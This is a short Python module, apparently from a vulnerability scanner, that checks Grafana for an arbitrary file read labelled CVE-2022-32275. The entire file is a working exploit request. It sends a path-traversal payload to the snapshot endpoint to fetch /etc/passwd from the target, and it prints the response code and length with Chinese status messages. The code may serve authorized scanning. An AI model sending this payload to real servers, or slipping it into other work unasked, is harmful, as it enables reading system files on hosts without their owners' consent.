#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet
urllib3.disable_warnings()

class Cve_2022_32275:

    def run(self, urls):
        urllib3.disable_warnings()
        url = urls + "/dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd"
        response = requests.get(url, headers=self.header, verify=self.ssl, proxies=self.proxy)
        OutPrintInfo("Grafana",'是否存在漏洞需自行检测')
        OutPrintInfo("Grafana",f'URL:[b bright_red]{url}[/b bright_red] 响应码:[b bright_red]{str(response.status_code)}[/b bright_red] 响应长度:[b bright_red]{str(len(response.text))}[/b bright_red]')

    def main(self, target):
        OutPrintInfo("Grafana",'开始执行Grafana任意文件读取检测')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]

        req = ReqSet(header=header, proxy=proxy)
        self.header = req["header"]
        self.proxy = req["proxy"]

        self.run(url)


        OutPrintInfo("Grafana",'Grafana任意文件读取检测结束')